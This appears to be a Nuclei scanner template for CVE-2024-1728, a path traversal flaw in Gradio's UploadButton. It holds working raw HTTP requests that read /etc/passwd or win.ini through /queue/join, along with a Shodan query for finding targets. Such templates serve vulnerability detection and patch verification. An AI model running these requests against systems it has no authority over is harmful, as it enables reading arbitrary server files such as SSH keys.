http:
- extractors:
  - internal: true
    name: extracted_path
    regex:
    - /tmp/gradio/[^/]+/passwd
    - C:.*\win\.ini
    type: regex
  matchers:
  - condition: or
    regex:
    - 'root:[^:]:0:0:'
    - \[(font|extension|file)s\]
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - /etc/passwd
    - /windows/win.ini
  raw:
  - 'POST /queue/join HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"data":[{"path":"{{path}}","url":"{{BaseURL}}/file=/help","orig_name":"CHANGELOG.md","size":3549,"mime_type":"text/markdown"}],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"{{randstr}}"}

    '
  - 'GET /queue/data?session_hash={{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /file={{extracted_path}} HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2024-1728
info:
  author: isacaya
  classification:
    cve-id: CVE-2024-1728
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99158
    epss-score: 0.81897
  description: 'gradio-app/gradio is vulnerable to a local file inclusion vulnerability
    due to improper validation of user-supplied input in the UploadButton component.

    '
  impact: 'Attackers can exploit this vulnerability to read arbitrary files on the
    filesystem, such as private SSH keys, by manipulating the file path in the request
    to the `/queue/join` endpoint. This issue could potentially lead to remote code
    execution. The vulnerability is present in the handling of file upload paths,
    allowing attackers to redirect file uploads to unintended locations on the server.

    '
  metadata:
    max-request: 5
    product: gradio
    shodan-query: html:"__gradio_mode__"
    vendor: gradio
    verified: true
  name: Gradio > 4.19.1 UploadButton - Path Traversal
  reference:
  - https://github.com/gradio-app/gradio/commit/16fbe9cd0cffa9f2a824a0165beb43446114eec7
  - https://huntr.com/bounties/9bb33b71-7995-425d-91cc-2c2a2f2a068a
  - https://nvd.nist.gov/vuln/detail/CVE-2024-1728
  remediation: 'Update to version 4.19.2.

    '
  severity: high
  tags: cve,cve2024,lfi,gradio,intrusive,vuln
